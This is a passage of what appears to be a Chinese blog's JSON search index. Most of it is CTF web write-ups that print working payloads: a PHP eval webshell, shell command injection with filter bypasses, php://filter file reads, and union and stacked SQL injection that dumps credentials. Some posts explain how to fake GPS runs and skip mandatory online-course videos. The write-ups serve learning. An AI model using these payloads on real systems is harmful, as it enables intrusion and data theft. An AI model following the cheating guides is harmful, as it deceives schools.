language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"burp","slug":"burp","permalink":"http://xjuun.github.io/tags/burp/"},{"name":"文件上传","slug":"文件上传","permalink":"http://xjuun.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"一句话木马","slug":"一句话木马","permalink":"http://xjuun.github.io/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"RoarCTF 2019 Easy Calc 1","slug":"RoarCTF 2019 Easy Calc 1","date":"2022-04-19T08:27:32.000Z","updated":"2022-04-19T08:34:58.369Z","comments":true,"path":"2022/04/19/RoarCTF 2019 Easy Calc 1/","link":"","permalink":"http://xjuun.github.io/2022/04/19/RoarCTF%202019%20Easy%20Calc%201/","excerpt":"","text":"尝试后发现，只能输入数字，查看网页源代码，可以看见calc.php,尝试打开calc.php，发现其过滤字符列表，如图： 可以打开，并且显示了源码 foreach 语法结构提供了遍历数组的简单方式。语法: 1234foreach (array_expression as $value) statementforeach (array_expression as $key =&gt; $value) statement 在这道题里，会对黑名单中的每一个值都拿出来连接成正则表达式的字符串，/m表示多行查找其他几个参数： 12345/i (忽略大小写)/g (全文查找出现的所有匹配字符)/m (多行查找)/gi(全文查找、忽略大小写)/ig(全文查找、忽略大小写) 假如绕过的话，我们就可以用eval执行任意php语句 给num参数传参，发现只能传数字，说明与WAF问题， WAF的问题：WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF 这里利用PHP的字符串解析特性来绕过WAF，如： 1calc.php? num=phpinfo(); scandir(/)可以查看根目录下的所有文件,用chr()来绕过waf,注意在calc.php页面提交所以就是： 123? num=print_r(scandir(&#x27;/&#x27;));这里由于单引号被过滤了，那就用chr()绕过，chr(47)就是斜杠/? num=print_r(scandir(chr(47))); 打开后，发现flagg文件，打开文件，即可发现flag， 123? num=print_r(file_get_contents(&#x27;/flagg&#x27;));这里/=chr(47)，f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); 总结;1、scandir(‘/‘)，foreach函数的运用2、chr码的简单应用","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"chr","slug":"chr","permalink":"http://xjuun.github.io/tags/chr/"},{"name":"scandir","slug":"scandir","permalink":"http://xjuun.github.io/tags/scandir/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"GXYCTF2019 Ping Ping Ping 1","slug":"GXYCTF2019-Ping-Ping-Ping-1","date":"2022-04-19T04:39:25.000Z","updated":"2022-04-19T04:41:48.057Z","comments":true,"path":"2022/04/19/GXYCTF2019-Ping-Ping-Ping-1/","link":"","permalink":"http://xjuun.github.io/2022/04/19/GXYCTF2019-Ping-Ping-Ping-1/","excerpt":"","text":"解题步骤：1，尝试用输入一个正确的IP地址 2，发现是linux系统下的网站，尝试用|和ls查看目录，列出文件3，尝试查看flag文件，发现不能直接打开，且空格被过滤，原因：关键字被过滤4，找到被过滤字符名单，尝试打开index.php文件，发现过滤字符列表 5，尝试绕过代码中有个 $a 考虑进行变量覆盖，构造如下 payload 12?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php?ip=127.0.0.1;a=g,cat$IFS$1fla$a.php 或者另外一种方法：内联输出：使用反引号 ``代替 |，经反引号的输出命令转换为输出构造playload 1?ip=110.242.68.3;cat$IFS$9`ls` 总结：1，如何看出是linux系统下的；2，|的作用3，index.php下有被过滤的字符的列表4，如何绕过空格linux下： 1234567$IFS$任意数字 $&#123;IFS&#125; , &lt; &lt;&gt; %20%09 6、有时 cat 可能被过滤，那么尝试用 tac，反向输出；或者 linux命令中可以加 \\，所以甚至可以 ca\\t /fl\\ag","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"绕过","slug":"绕过","permalink":"http://xjuun.github.io/tags/%E7%BB%95%E8%BF%87/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"极客大挑战 2019 Http 1","slug":"极客大挑战-2019-Http-1","date":"2022-04-19T04:38:41.000Z","updated":"2022-04-19T04:55:58.725Z","comments":true,"path":"2022/04/19/极客大挑战-2019-Http-1/","link":"","permalink":"http://xjuun.github.io/2022/04/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1/","excerpt":"","text":"打开网站，打开源代码，会发现一个secret.php的东西，然后打开，会发现说不是https://www.Sycsecret.com这个网址来的，所以打开burp，修改referer头，在repeater里面尝试，会发现说不是Syclover这个浏览器，所以修改浏览器信息，然后再send，发现说必须本地打开才行，所以添加X Forwarded-For，改为： 12X-Forwarded-For:127.0.0.1或者X-Forwarded-For:localhost 然后send就会返回flag 总结：考查burp的使用和http数据报相关知识 HTTP X-Forwarded-For 介绍： X-Forwarded-For 是一个 HTTP 扩展头部。HTTP/1.1（RFC2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（ForwardedHTTP Extension）标准之中。 如果一个 HTTP 请求到达服务器之前，经过了三个代理Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF标准，服务端最终会收到以下信息： php X-Forwarded-For: IP0, IP1, IP2 Proxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，RemoteAddress 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。 Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是$_SERVER[“REMOTE_ADDR”]，Node.js 是 req.connection.remoteAddress，但原理都一样。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"burp","slug":"burp","permalink":"http://xjuun.github.io/tags/burp/"},{"name":"数据报","slug":"数据报","permalink":"http://xjuun.github.io/tags/%E6%95%B0%E6%8D%AE%E6%8A%A5/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"极客大挑战 2019 Knife 1","slug":"极客大挑战 2019 Knife 1","date":"2022-04-19T04:34:33.000Z","updated":"2022-04-19T04:37:53.196Z","comments":true,"path":"2022/04/19/极客大挑战 2019 Knife 1/","link":"","permalink":"http://xjuun.github.io/2022/04/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20Knife%201/","excerpt":"","text":"发现是一句话木马，使用蚁剑连接，在根目录下找到flag文件或者是用post提交方式，提交参数 1Syc=system(&#x27;cat /flag&#x27;); 总结：eavl函数的作用，所有的字符串放入到eval当中，eval会把字符串解析为php代码来进行执行，那么结合$_POST[‘Syc’]的话，只要使用post传输时在name为Syc的值中写入任何字符串，都可以当做php代码来执行。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"文件上传","slug":"文件上传","permalink":"http://xjuun.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"极客大挑战 2019 Secret File","slug":"极客大挑战 2019 Secret File","date":"2022-04-16T13:44:11.000Z","updated":"2022-04-19T05:05:54.150Z","comments":true,"path":"2022/04/16/极客大挑战 2019 Secret File/","link":"","permalink":"http://xjuun.github.io/2022/04/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20Secret%20File/","excerpt":"","text":"查看源码，发现有一个 achieve_room.php，打开burp，抓包，发现其有一个隐藏的回应 secr3t.php 1http://775fc2bb-8c0b-479c-ad02-65fecd0225ed.node4.buuoj.cn:81/secr3t.php 打开php如图：试着直接打开flag.php,发现没有，然后看wp说可以用php伪协议来读取flag.php构造playload: 1http://775fc2bb-8c0b-479c-ad02-65fecd0225ed.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 得到如图：base64解码即可得到flag 总结：学到了php伪协议来读取flag.php相关知识 来自百度：php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=flag.php 表示目标文件为flag.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，flag.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php://input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"php伪协议","slug":"php伪协议","permalink":"http://xjuun.github.io/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"GXYCTF 2019 BabySQli","slug":"GXYCTF 2019 BabySQli","date":"2022-04-16T13:38:11.000Z","updated":"2022-04-17T06:49:51.022Z","comments":true,"path":"2022/04/16/GXYCTF 2019 BabySQli/","link":"","permalink":"http://xjuun.github.io/2022/04/16/GXYCTF%202019%20BabySQli/","excerpt":"","text":"先用了一些自己知道的弱口令之类的试了一下，显而易见，没做出来，然后看了大佬们的wp 先用UserName=admin&amp;password=1，出现提示：查看网页源代码，发现一串加密过的字符串，经过base32解密，又经过base64解密后，得到： 1select * from user where username = ‘$name’ 这个提示告诉了他只去select了username；然后我们可以运用union的特点 1在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。 copy的别人的图： 经过试验，发现其有3个字段，分别是：id,username,pw,而且其密码是MD5加密，所以可用pyload： 1name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27;#&amp;pw=123 注意;这里可以用burp直接加在post处得flag，如图： 或者在登录界面分别在账号框填：1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#在密码框填：pw=123 总结：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。（那么其使用条件是什么？） 后台数据库的登录逻辑大概是：将输入的用户名与后台数据库中的所有用户名做比较，找出相等的，然后用这组数据的密码与用户输入的密码作比较，若相等，则登录成功。（那么正常的账号密码登录的逻辑是什么？）","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"union","slug":"union","permalink":"http://xjuun.github.io/tags/union/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"极客大挑战 2019 BabySQL 1","slug":"极客大挑战 2019 BabySQL 1","date":"2022-04-16T13:38:11.000Z","updated":"2022-04-19T04:58:15.023Z","comments":true,"path":"2022/04/16/极客大挑战 2019 BabySQL 1/","link":"","permalink":"http://xjuun.github.io/2022/04/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20BabySQL%201/","excerpt":"","text":"练习阶段，所以当自己试了union等自己所知道的注入方法没做出来后，就直接看了wp 其过滤了过滤 select or and union from password等关键词 所以用双写绕过（思考：是只能用双写绕过吗？不能用大小写、双写关键词、编码等绕过？）剩下的就是常规的联合注入了：所用代码如下： 12345678http://c2647597-2468-4ccb-94e0-3ffd5876387d.node4.buuoj.cn:81/check.php?username=admin&amp;password=admin&#x27; ununionion sselectelect 1,2,3 %23http://c2647597-2468-4ccb-94e0-3ffd5876387d.node4.buuoj.cn:81/check.php?username=admin&amp;password=admin&#x27; uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23http://c2647597-2468-4ccb-94e0-3ffd5876387d.node4.buuoj.cn:81/check.php?username=admin&amp;password=admin&#x27; uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=&#x27;b4bsql&#x27;%23http://c2647597-2468-4ccb-94e0-3ffd5876387d.node4.buuoj.cn:81/check.php?username=admin&amp;password=admin&#x27; uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23 总结：了解了一种新的绕过方法","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"注入绕过","slug":"注入绕过","permalink":"http://xjuun.github.io/tags/%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"SUCTF 2019 EasySQL 1(堆叠注入)","slug":"SUCTF 2019 EasySQL 1(堆叠注入)","date":"2022-04-16T13:31:11.000Z","updated":"2022-04-19T04:59:06.667Z","comments":true,"path":"2022/04/16/SUCTF 2019 EasySQL 1(堆叠注入)/","link":"","permalink":"http://xjuun.github.io/2022/04/16/SUCTF%202019%20EasySQL%201(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/","excerpt":"","text":"个人比较菜，自己尝试了一会，就直接看wp了解题过程：1：利用其没过滤*，直接用*,1来注入，直接得到flag不过需要从报错中猜到其sql语句select $_GET[&#39;query&#39;] || flag from Flag，其拼接语句是：select *,1||flag from Flag，这句话的意思是，当1为真的时候，直接查询1from flag，这句话的意思是：执行这条查询语句会将表中的所有数据查询出来并且在后面增加一列列名和内容都是1的列，因为后端是只有一个Flag的表，表里只有一个字段flag，也只有一行数据，2：利用||，将||作为字符串连接符，因此需要在语句中更改其配置sql_mode=PIPES_AS_CONCAT时即可注入语句：1;set sql_mode=PIPES_AS_CONCAT;select 1拼接后得到：select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag，它会将表中的flag列带出来 总结：学到了MySQL修改sql_mode=pipes_as_concat的用法和适用场景和oracle与MySQL “ || “ 符号的区别","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"堆叠注入","slug":"堆叠注入","permalink":"http://xjuun.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"墨者 SQL手工注入漏洞测试(MySQL数据库)","slug":"墨者 SQL手工注入漏洞测试(MySQL数据库)","date":"2022-04-04T14:23:11.000Z","updated":"2022-04-19T05:01:15.581Z","comments":true,"path":"2022/04/04/墨者 SQL手工注入漏洞测试(MySQL数据库)/","link":"","permalink":"http://xjuun.github.io/2022/04/04/%E5%A2%A8%E8%80%85%20SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)/","excerpt":"","text":"测试注入点 http://124.70.64.48:40014/new_list.php?id=1sdaf 不显示，说明存在注入点 order by http://124.70.64.48:40014/new_list.php?id=1%20order%20by%205 报错猜解准备 http://124.70.64.48:40014/new_list.php?id=-1%20union%20select%201,2,3,4 查询信息（联合注入）（注意 id=后面需要用个错误的值，如-1）（version(),user(),database(),@@version_compile_os） http://124.70.64.48:40014/new_list.php?id=-1%20union%20select%201,version(),database(),4 得到其信息分别为： version() 5.7.22-0ubuntu0.16.04.1database（） mozhe_Discuz_StormGroupuser（） root@localhost@@version_compile_os Linux 查表得（StormGroup_member,notice） http://124.70.64.48:40014/new_list.php?id=-1%20union%20select%201,group_concat(table_name)%20,3,4%20from%20information_schema.tables%20where%20table_schema=%27mozhe_Discuz_StormGroup%27 5.查列得（id,name,password,status） http://124.70.64.48:40014/new_list.php?id=-1%20union%20select%201,group_concat(column_name)%20,3,4%20from%20information_schema.columns%20where%20table_name=%27StormGroup_member%27 6.查具体信息得账号密码，密码需MD5解密，然后登录后得key http://124.70.64.48:40014/new_list.php?id=-1%20union%20select%201,group_concat(name),group_concat(password),4%20from%20StormGroup_member 7.emmm，最后登录不上去","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://xjuun.github.io/tags/web/"},{"name":"墨者","slug":"墨者","permalink":"http://xjuun.github.io/tags/%E5%A2%A8%E8%80%85/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"论“正确”的看学习通上面的网课","slug":"论“正确”的看学习通上的网课","date":"2021-11-10T14:27:11.000Z","updated":"2022-04-19T05:07:44.054Z","comments":true,"path":"2021/11/10/论“正确”的看学习通上的网课/","link":"","permalink":"http://xjuun.github.io/2021/11/10/%E8%AE%BA%E2%80%9C%E6%AD%A3%E7%A1%AE%E2%80%9D%E7%9A%84%E7%9C%8B%E5%AD%A6%E4%B9%A0%E9%80%9A%E4%B8%8A%E7%9A%84%E7%BD%91%E8%AF%BE/","excerpt":"","text":"解决了，如何“正确”的进行步道乐跑后，我觉得是不是也可以“正确”的在线学习学习通上面的网课。 看了很多大佬写的文章，很多都是要搞脚本之类的，感觉太那啥了，不一定好配置，然后就找到了一个虽然麻烦，但很容易学会的方法来解决学习通上面网课不能拉进度条的问题。 下面是我的具体过程（我用的是QQ浏览器，别的浏览器可能会有细微差别但影响不大）： 1. 找到要操作的视频 二、找到菜单—工具—开发者工具 三、点击ctrl+f（搜索代码的快捷键），然后把它ans-attach-online ans-insertvideo-online放进去，找到这段代码所在的位置，右键单击“编辑为HTML”。 四、找到代码fastforward=&quot;true&quot;，并删除，然后返回原视频播放页面，就可以拉动进度条了。还是自己找个脚本吧，网课太多了，刷的手疼，emmm！","categories":[{"name":"小爱好","slug":"小爱好","permalink":"http://xjuun.github.io/categories/%E5%B0%8F%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"鼓捣","slug":"鼓捣","permalink":"http://xjuun.github.io/tags/%E9%BC%93%E6%8D%A3/"},{"name":"插件","slug":"插件","permalink":"http://xjuun.github.io/tags/%E6%8F%92%E4%BB%B6/"}],"keywords":[{"name":"小爱好","slug":"小爱好","permalink":"http://xjuun.github.io/categories/%E5%B0%8F%E7%88%B1%E5%A5%BD/"}]},{"title":"论“正确”使用步道乐跑（二）","slug":"论“正确”的使用步道乐跑（二）","date":"2021-11-10T14:24:13.000Z","updated":"2022-04-19T05:06:52.513Z","comments":true,"path":"2021/11/10/论“正确”的使用步道乐跑（二）/","link":"","permalink":"http://xjuun.github.io/2021/11/10/%E8%AE%BA%E2%80%9C%E6%AD%A3%E7%A1%AE%E2%80%9D%E7%9A%84%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%81%93%E4%B9%90%E8%B7%91%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"有了想法后，然后看了很多大佬的方法，很多都是用Fake Location，但一看好像要花钱注册会员，作为资深白嫖党，果断放弃，然后就找到了一个使用模拟器的方法，除了不能提前规划路线，一天只能上传一次和不能修改跑步时间外，感觉还是挺好用的。（可以上传上去，而且还是有效成绩，至于最后会不会被发现，看人品吧！）（此文章纯属个人爱好，紧供参考学习，勿实践）一、下载夜神模拟神器，官网下载，按提示下载安装就行，然后打开，在它里面的商城中找到步道乐跑，下载下来。二、打开步道乐跑，登录进去，建议先绑定电话号码，一个验证码可以用30天，很方便。三、依次点击这两个标记的地方，然后手动输入你的位置（自动定位不到你所在的位置） 四、点击这个，然后再选择模拟行走，保存后，就可以用按A,S,D,W键控制行走方向。 总结，不能提前设置路线有点遗憾，不能提前设置好配速，不能直接改变时间，实现一天刷多次，有点拉，别的感觉都还行。上诉不足正在学习解决，有办法的欢迎留言指教。","categories":[{"name":"小爱好","slug":"小爱好","permalink":"http://xjuun.github.io/categories/%E5%B0%8F%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"鼓捣","slug":"鼓捣","permalink":"http://xjuun.github.io/tags/%E9%BC%93%E6%8D%A3/"},{"name":"插件","slug":"插件","permalink":"http://xjuun.github.io/tags/%E6%8F%92%E4%BB%B6/"}],"keywords":[{"name":"小爱好","slug":"小爱好","permalink":"http://xjuun.github.io/categories/%E5%B0%8F%E7%88%B1%E5%A5%BD/"}]},{"title":"论“正确”使用步道乐跑（一）","slug":"论“正确”使用步道乐跑（一）","date":"2021-11-09T17:32:43.000Z","updated":"2022-04-19T05:03:16.744Z","comments":true,"path":"2021/11/10/论“正确”使用步道乐跑（一）/","link":"","permalink":"http://xjuun.github.io/2021/11/10/%E8%AE%BA%E2%80%9C%E6%AD%A3%E7%A1%AE%E2%80%9D%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%81%93%E4%B9%90%E8%B7%91%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"吹着冷风，开始思考步道乐跑，好像似乎应该可以刷一下！哦，不对，读书人怎么能叫刷呢？我只是想研究一下关于步道乐跑的技术罢了！","categories":[{"name":"小爱好","slug":"小爱好","permalink":"http://xjuun.github.io/categories/%E5%B0%8F%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"鼓捣","slug":"鼓捣","permalink":"http://xjuun.github.io/tags/%E9%BC%93%E6%8D%A3/"},{"name":"插件","slug":"插件","permalink":"http://xjuun.github.io/tags/%E6%8F%92%E4%BB%B6/"}],"keywords":[{"name":"小爱好","slug":"小爱好","permalink":"http://xjuun.github.io/categories/%E5%B0%8F%E7%88%B1%E5%A5%BD/"}]},{"title":"（bugku）（0和1的故事）","slug":"（bugku）（0和1的故事）","date":"2021-11-08T13:00:40.000Z","updated":"2022-04-19T05:04:32.158Z","comments":true,"path":"2021/11/08/（bugku）（0和1的故事）/","link":"","permalink":"http://xjuun.github.io/2021/11/08/%EF%BC%88bugku%EF%BC%89%EF%BC%880%E5%92%8C1%E7%9A%84%E6%95%85%E4%BA%8B%EF%BC%89/","excerpt":"​ 身为小白的我，开始看见题目就头皮发麻，先是看评论，知道这个东西要搞成二维码，但问题来了，小白不会脚本，然后就老实的用excel做吧，再然后发现怎么也不能直接把数字直接粘贴到excel的每一个表格中，再然后就是搜教程，分列，再定位填充等等，然后再到ps上拼上定位角。","text":"​ 身为小白的我，开始看见题目就头皮发麻，先是看评论，知道这个东西要搞成二维码，但问题来了，小白不会脚本，然后就老实的用excel做吧，再然后发现怎么也不能直接把数字直接粘贴到excel的每一个表格中，再然后就是搜教程，分列，再定位填充等等，然后再到ps上拼上定位角。 ​ 下面就开始讲讲我的心酸历程。 ​ 这个是下载后的txt文件截图（0和1看的头晕），文件在最后，有兴趣的大佬可以自己试试 。 然后复制粘贴到excel（巨麻烦） 1、该单元格格式，把它改成文本格式，要不然1前面的0都会消失，别问为什么知道的，问就是泪（步骤：先选中单元格，单击右键——单元格式——文本）； 2、分列的时候用先选中那一列（注意是单独的一列，要不然分不了）（步骤：选中一列——数据——分列——固定宽度——按提示开始分列） 3、分列完成后，调一下行宽与列宽，搞成正方形，具体怎么搞百度一下。成品如图， 4、把0替换成空格，再定位出1所在的位置，填充成黑色。 快捷键：ctrl+h。定位的时候选择数据，然后勾选常量、数字，别的都不要勾选。如图： 5、定位出1所在的位置后，再填充成黑色，如图: 6、截图，然后直接在ps中进行最后的拼接得到二维码。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://xjuun.github.io/tags/ctf/"},{"name":"misc","slug":"misc","permalink":"http://xjuun.github.io/tags/misc/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"html学习笔记","slug":"html 学习笔记","date":"2021-11-08T12:50:12.000Z","updated":"2022-04-19T05:09:29.171Z","comments":true,"path":"2021/11/08/html 学习笔记/","link":"","permalink":"http://xjuun.github.io/2021/11/08/html%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"1， &lt;h1 align=&quot;center&quot;&gt; 标题居中 2，&lt;body style=&quot;background-color:yellow&quot;&gt; 改变背景颜色(PowderBlue),也可以是&lt;h2 style=&quot;background-color:red&quot;&gt; 等等","text":"1， &lt;h1 align=&quot;center&quot;&gt; 标题居中 2，&lt;body style=&quot;background-color:yellow&quot;&gt; 改变背景颜色(PowderBlue),也可以是&lt;h2 style=&quot;background-color:red&quot;&gt; 等等 3，font-family、color 以及 font-size 定义了其字体、颜色、大小 例如：&lt;p style=&quot;font-family:arial;color:red;font-size:20px;&quot;&gt; 4，text-align定义了元素中文本的水平对齐方式，例如：&lt;h1 style=&quot;text-align:center&quot;&gt; 5，&lt;a herf=&quot;\\\\\\\\.com&quot;&gt;插入链接，例如： &lt;a href=&quot;http://www.w3school.com.cn/&quot; target=&quot;_blank&quot;&gt;Visit W3School!&lt;/a&gt;，其target属性可改变链接的文档在何处显示 6，利用pre标签，可以保存空行和空格 7，标题正常只显示缩写，当鼠标移动到那时显示完整的，例如下面两种方法&lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt; &lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;8，块引用，使用 blockquote 元素的话，浏览器会插入换行和外边距，而 q 元素不会有任何特殊的呈现。9，用图片做链接，例如：&lt;a href=&quot;/example/html/lastpage.html&quot;&gt; &lt;img border=&quot;0&quot; src=&quot;/i/eg_buttonnext.gif&quot; /&gt; &lt;/a&gt;10，插入图片，图像由 img标签定义，要在页面上显示图像，你需要使用源属性（src）。src 指 “source”。源属性的值是图像的 URL 地址。例如：&lt;img src=&quot;url&quot; /&gt; ，背景图片设置&lt;body background=&quot;/i/eg_background.jpg&quot;&gt; ，通过设置 align属性，来设置图片的对齐方式和图在的位置11，通过tr，td设置表格，并通过border的值设置边框，每个表格由 table 标签开始。每个表格行由 tr 标签开始。每个表格数据由 td 标签开始。并用&amp;nbsp当作占位符在空表格中使用。​例如：` 一行三列： 100 200 300 ` 它的的代码是` 1234567&lt;table border=&quot;1&quot;&gt;&lt;tr&gt; &lt;td&gt;100&lt;/td&gt; &lt;td&gt;200&lt;/td&gt; &lt;td&gt;300&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;` 12，有序列表和无序列表，例如： 一个无序列表： 咖啡 茶 牛奶 它的代码是 123456&lt;h4&gt;一个无序列表：&lt;/h4&gt;&lt;ul&gt; &lt;li&gt;咖啡&lt;/li&gt; &lt;li&gt;茶&lt;/li&gt; &lt;li&gt;牛奶&lt;/li&gt;&lt;/ul&gt; 有序列表如： 咖啡 牛奶 茶 它的代码是： 12345&lt;ol start=&quot;50&quot;&gt; &lt;li&gt;咖啡&lt;/li&gt; &lt;li&gt;牛奶&lt;/li&gt; &lt;li&gt;茶&lt;/li&gt;&lt;/ol&gt;","categories":[{"name":"语言学习","slug":"语言学习","permalink":"http://xjuun.github.io/categories/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://xjuun.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"html","slug":"html","permalink":"http://xjuun.github.io/tags/html/"}],"keywords":[{"name":"语言学习","slug":"语言学习","permalink":"http://xjuun.github.io/categories/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"ctf (bugku) 恋爱的魅力（哈哈，自己取的名字）（原名：社工进阶搜集）","slug":"ctf (bugku) 恋爱的魅力（哈哈，自己取的名字）（原名：社工进阶搜集）","date":"2021-11-08T12:43:12.000Z","updated":"2022-04-17T06:49:26.961Z","comments":true,"path":"2021/11/08/ctf (bugku) 